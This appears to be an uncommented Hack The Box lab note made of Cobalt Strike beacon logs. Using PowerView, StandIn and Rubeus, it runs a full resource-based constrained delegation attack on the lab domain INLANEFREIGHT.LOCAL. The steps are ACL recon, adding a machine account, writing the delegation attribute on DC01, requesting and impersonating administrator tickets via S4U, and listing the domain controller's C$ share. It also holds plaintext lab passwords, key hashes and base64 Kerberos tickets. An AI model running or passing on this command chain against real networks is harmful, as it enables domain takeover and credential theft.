



















---- 

Hack The Box Reference point



```python
/opt/resources/windows/PowerSploit/Recon/PowerView.ps1
```


```python
/opt/resources/windows/SharpCollection/NetFramework_4.7_Any/Rubeus.exe
```



```python
/opt/resources/windows/SharpCollection/NetFramework_4.7_Any/StandIn.exe
```



```python
spawnas inlanefreight.local\carole.holmes Y3t4n0th3rP4ssw0rd HTTP-1
```




```python
[04/13 00:17:40] beacon> powershell Get-Domain
[04/13 00:17:40] [*] Tasked beacon to run: Get-Domain
[04/13 00:17:41] [+] host called home, sent: 297 bytes
[04/13 00:17:42] [+] received output:
#< CLIXML


Forest                  : INLANEFREIGHT.LOCAL
DomainControllers       : {DC01.INLANEFREIGHT.LOCAL}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC01.INLANEFREIGHT.LOCAL
RidRoleOwner            : DC01.INLANEFREIGHT.LOCAL
InfrastructureRoleOwner : DC01.INLANEFREIGHT.LOCAL
Name                    : INLANEFREIGHT.LOCAL

```



```python
[04/13 00:18:28] beacon> powershell Get-DomainSID
[04/13 00:18:28] [*] Tasked beacon to run: Get-DomainSID
[04/13 00:18:29] [+] host called home, sent: 305 bytes
[04/13 00:18:30] [+] received output:
#< CLIXML
S-1-5-21-1870146311-1183348186-593267556
```



```python
[04/13 00:19:24] beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-1870146311-1183348186-593267556-[\d]{4,10}" }
[04/13 00:19:24] [*] Tasked beacon to run: Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-1870146311-1183348186-593267556-[\d]{4,10}" }
[04/13 00:19:24] [+] host called home, sent: 889 bytes
[04/13 00:19:29] [+] received output:
#< CLIXML


AceType               : AccessAllowed
ObjectDN              : CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : WriteProperty
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1870146311-1183348186-593267556-1002
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1870146311-1183348186-593267556-1106
AccessMask            : 32
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```



```python
[04/13 00:20:56] beacon> powershell ConvertFrom-SID S-1-5-21-1870146311-1183348186-593267556-1106
[04/13 00:20:56] [*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-1870146311-1183348186-593267556-1106
[04/13 00:20:56] [+] host called home, sent: 433 bytes
[04/13 00:20:57] [+] received output:
#< CLIXML
INLANEFREIGHT\carole.holmes
```



```python
[04/13 00:31:35] beacon> powershell Get-DomainObject -Identity "DC=inlanefreight,DC=local" -Properties ms-DS-MachineAccountQuota
[04/13 00:31:35] [*] Tasked beacon to run: Get-DomainObject -Identity "DC=inlanefreight,DC=local" -Properties ms-DS-MachineAccountQuota
[04/13 00:31:36] [+] host called home, sent: 517 bytes
[04/13 00:31:37] [+] received output:
#< CLIXML

ms-ds-machineaccountquota
-------------------------
                       10

```




```python
[04/13 00:25:15] beacon> inlineExecute-Assembly --dotnetassembly /opt/resources/windows/SharpCollection/NetFramework_4.7_Any/StandIn.exe --assemblyargs --computer EvilComputer --make
[04/13 00:25:15] [*] Running inlineExecute-Assembly by (@anthemtotheego)
[04/13 00:25:17] [+] host called home, sent: 85260 bytes
[04/13 00:26:03] [+] received output:



[?] Using DC    : DC01.INLANEFREIGHT.LOCAL
    |_ Domain   : INLANEFREIGHT.LOCAL
    |_ DN       : CN=EvilComputer,CN=Computers,DC=inlanefreight,DC=local
    |_ Password : glFENgC6D9yBdnY

[+] Machine account added to AD..
[+] inlineExecute-Assembly Finished
```



```python
[04/13 00:50:51] beacon> powershell Get-DomainComputer -Identity EvilComputer -Properties objectSid
[04/13 00:50:51] [*] Tasked beacon to run: Get-DomainComputer -Identity EvilComputer -Properties objectSid
[04/13 00:50:53] [+] host called home, sent: 441 bytes
[04/13 00:50:54] [+] received output:
#< CLIXML

objectsid                                    
---------                                    
S-1-5-21-1870146311-1183348186-593267556-4103

```



```python
[04/13 00:52:18] beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1870146311-1183348186-593267556-4103)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "DC01" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
[04/13 00:52:18] [*] Tasked beacon to run: $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1870146311-1183348186-593267556-4103)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "DC01" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
[04/13 00:52:20] [+] host called home, sent: 1209 bytes
[04/13 00:52:22] [+] received output:
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="verbose">[Get-DomainSearcher] search base: LDAP://DC=INLANEFREIGHT,DC=LOCAL</S><S S="verbose">[Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL'</S><S S="verbose">[Get-DomainSearcher] search base: LDAP://DC=INLANEFREIGHT,DC=LOCAL</S><S S="verbose">[Get-DomainObject] Get-DomainObject filter string: (&amp;(|(distinguishedname=CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL)))</S><S S="verbose">[Set-DomainObject] Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 7 43 120 111 218 117 136 70 100 139 92 35 7 16 0 0' for object 'DC01$'</S></Objs>

```

```python
[04/13 00:28:15] beacon> inlineExecute-Assembly --dotnetassembly /opt/resources/windows/SharpCollection/NetFramework_4.7_Any/Rubeus.exe --assemblyargs hash /password:glFENgC6D9yBdnY /user:EvilComputer$ /domain:inlanefreight.local
[04/13 00:28:15] [*] Running inlineExecute-Assembly by (@anthemtotheego)
[04/13 00:28:17] [+] host called home, sent: 475964 bytes
[04/13 00:28:18] [+] received output:



   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 


[*] Action: Calculate Password Hash(es)

[*] Input password             : glFENgC6D9yBdnY
[*] Input username             : EvilComputer$
[*] Input domain               : inlanefreight.local
[*] Salt                       : INLANEFREIGHT.LOCALhostevilcomputer.inlanefreight.local
[*]       rc4_hmac             : BBAB6BCA1B9A461FD42F9ED43F113373
[*]       aes128_cts_hmac_sha1 : A10DDAB7E27659576F06108D63365B04
[*]       aes256_cts_hmac_sha1 : 84C8A258FDEFF8A74D6411C9B74DDBCBA1D2C94D298DE994BEF0610913F304F8
[*]       des_cbc_md5          : 16FE3D5BE67091D9


[04/13 00:28:18] [+] received output:
[+] inlineExecute-Assembly Finished

```


```python
[04/13 00:29:31] beacon> inlineExecute-Assembly --dotnetassembly /opt/resources/windows/SharpCollection/NetFramework_4.7_Any/Rubeus.exe --assemblyargs asktgt /aes256:84C8A258FDEFF8A74D6411C9B74DDBCBA1D2C94D298DE994BEF0610913F304F8 /user:EvilComputer$ /nowrap
[04/13 00:29:31] [*] Running inlineExecute-Assembly by (@anthemtotheego)
[04/13 00:29:32] [+] host called home, sent: 475993 bytes
[04/13 00:29:33] [+] received output:



   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Got domain: INLANEFREIGHT.LOCAL
[*] Using aes256_cts_hmac_sha1 hash: 84C8A258FDEFF8A74D6411C9B74DDBCBA1D2C94D298DE994BEF0610913F304F8
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\EvilComputer$'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  EvilComputer$ (NT_PRINCIPAL)
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  4/12/2025 4:29:34 PM
  EndTime                  :  4/13/2025 2:29:34 AM
  RenewTill                :  4/19/2025 4:29:34 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  F70wXefWmifH+arMLxj/pmmNbma+bBIpYH/zPEN0FtE=
  ASREP (key)              :  84C8A258FDEFF8A74D6411C9B74DDBCBA1D2C94D298DE994BEF0610913F304F8



[04/13 00:29:33] [+] received output:
[+] inlineExecute-Assembly Finished
```



```python
inlineExecute-Assembly --dotnetassembly /opt/resources/windows/SharpCollection/NetFramework_4.7_Any/Rubeus.exe --assemblyargs s4u /user:EvilComputer$ /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ticket:  /nowrap
```


```python
[04/13 00:53:18] beacon> inlineExecute-Assembly --dotnetassembly /opt/resources/windows/SharpCollection/NetFramework_4.7_Any/Rubeus.exe --assemblyargs s4u /user:EvilComputer$ /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ticket:doIGFzCCBhOgAwIBBaEDAgEWooIFATCCBP1hggT5MIIE9aADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggSrMIIEp6ADAgESoQMCAQKiggSZBIIElTqDPWZlC+9+MPAaTftcIfZqkx2lZeYwWd6/xdH4B6ipaZCOHgukm4gWNLUk7ZCXax+QY8HbagrNaIWS/HHPdQKBum0dWC1WX/sWxhfhJ9p5qNybY3Bq8E0rkhsEe9Imf2oU1J+H0LJJFUHviBQXZ4WsNSZDep29M9HY+RpXzxvYzWx0tBNkoge+C1hc2vu6W99Pw+/lLjrtmKX9mRYY2Gkkfvlmx3i12iox88SpBA/qwiqvl7iLKVRuuBK1oxdhbAYLkXmp+xzhQ4NLeQ+dw0BW0+BSnaCvcJMgcy5cJneyu17l3H8+uSFv46eMeNante4NZ7Rxe9IJBMbuMQF/pMT/2lrJglOSptRNQwaRC27essMxpkWAOCwxSPPdi2z4tWm3J++WVtIdwbhgJhGW/2CnXQtIlmMxDuINwKtVZdcaE4Ci/wcuuK4nazXKxEG1Yt4hvq2mW1n0UqbqIZcNIlNd4qlmIFMW5kux83GERDGmqYN04QRa+b5nIkyuOXRPKQhXItWQMkiEKlreTNcfB7ofmVUQH+0o6mKVO26YkIy77zC4iHiPZYTcOiRG4q3JvdOhkz9A+aDRpnXMgqcr/lXrbPp1r04N7GMMy5YmCEMeiR1aGkW22PrZ3hNPoJqZVkTp9OMZEo1gwMTTQiwFAcX8+4BdG1ypgewVgDOlX0g1BEx6PKHbGEG58Ed3IpRC0LBG8WOhKuy51fmNf2yBJ7x+PYawH7Fz2KlNT9KDgSmNmVnl0u8dycImMI9wq0DuNd/4gvwKHw9nEwSpJ0PzqCimvsp+Z9TUfYGEC5ZUQfjTvRyAplsRYQDPU/ZdzGZneGdkPEhtmiHftcy9okclbr4HRn2kCuiUkS1+hzsxQeeeNTrXblG5MZZMG5KLBvaiisqbOW9qW9weBTPhU5XpphPyO9kXe6k128S3bLw7h0t7C2pX3Elk3j7b0P3q9qyZXpuAwR3VJr2Txr5NOWOT68XMu2EuFldcAYefkAgiYEkhEdaURtyIlRD6YB2xCBsWPzXLqZUs32BlWsWpUxtoDBUj3CRBnUk/Zr8rYTpJ2JOh6Aik1AalAEK1pi8To0LXhnYVoputw9xqkQSu6oQ5Oh0Mu6cof+IT86XsdCfXUWF15gjgsEvuPSfcOBk9+/TQsrX4VosFruUL5WobfeUKLO4I0Ow/nwd1s8KZG+JBhqkjGJCAVW1UW+6g5skuLCt7kYPeqr/kmbqDS+4sgHOjeKn/rjtB1qI6ypqj6cMMmkJ8+r3TyirHTQhN1EnoqfNbJhmqzpNBElAAPEmob1T2IMmWzthX0hm6tRuHOu1PShlYjquSZ9ZsDlQqnnov/dZZSf97yeIChE70rLpZo5XcXg5fO5KTiXoj2igE65vu41FkMupm5sEv+Zvey7BEQUwFO5vZqgiMict4qzR/LGdEqMppzOnQcpVR4HwQk9cw+crldMsvEQsYVIpR4pqg9jlxB+vCTN+n1vUcKTxxXUHuJlT8sWMephMuoT9AnaYe65kFB7RgdBVGRaK6SyQsX1O3lM9lJdLCYJa1qzP2QXz22rXi3d3wxqOCAQAwgf2gAwIBAKKB9QSB8n2B7zCB7KCB6TCB5jCB46ArMCmgAwIBEqEiBCAXvTBd59aaJ8f5qswvGP+maY1uZr5sEilgf/M8Q3QW0aEVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohowGKADAgEBoREwDxsNRXZpbENvbXB1dGVyJKMHAwUAQOEAAKURGA8yMDI1MDQxMjIxMjkzNFqmERgPMjAyNTA0MTMwNzI5MzRapxEYDzIwMjUwNDE5MjEyOTM0WqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM   /nowrap
[04/13 00:53:18] [*] Running inlineExecute-Assembly by (@anthemtotheego)
[04/13 00:53:20] [+] host called home, sent: 478080 bytes
[04/13 00:53:23] [+] received output:



   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'EvilComputer$@INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2self request to 172.16.99.3:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'EvilComputer$@INLANEFREIGHT.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.inlanefreight.local'
[*] Building S4U2proxy request for service: 'cifs/dc01.inlanefreight.local'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Sending S4U2proxy request to domain controller 172.16.99.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01.inlanefreight.local':

      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


[04/13 00:53:23] [+] received output:
[+] inlineExecute-Assembly Finished

```






```python
[04/13 00:54:34] beacon> ls \\dc01.inlanefreight.local\C$
[04/13 00:54:34] [*] Tasked beacon to list files in \\dc01.inlanefreight.local\C$
[04/13 00:54:36] [+] host called home, sent: 47 bytes
[04/13 00:54:36] [*] Listing: \\dc01.inlanefreight.local\C$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     10/14/2022 10:46:09   $Recycle.Bin
          dir     04/03/2023 14:58:00   carole.holmes
          dir     10/06/2021 09:26:27   Config.Msi
          dir     10/06/2021 15:38:04   Documents and Settings
          dir     02/25/2022 10:20:48   PerfLogs
          dir     10/06/2021 15:50:50   Program Files
          dir     04/12/2023 15:24:16   Program Files (x86)
          dir     04/12/2023 15:00:19   ProgramData
          dir     03/30/2023 11:08:25   Shares
          dir     04/10/2023 05:27:16   System Volume Information
          dir     04/04/2023 13:49:52   Tools
          dir     03/30/2023 15:13:18   Unconstrained
          dir     04/04/2023 11:34:55   Users
          dir     10/14/2022 06:49:58   Windows
 704mb    fil     04/12/2025 15:54:48   pagefile.sys
```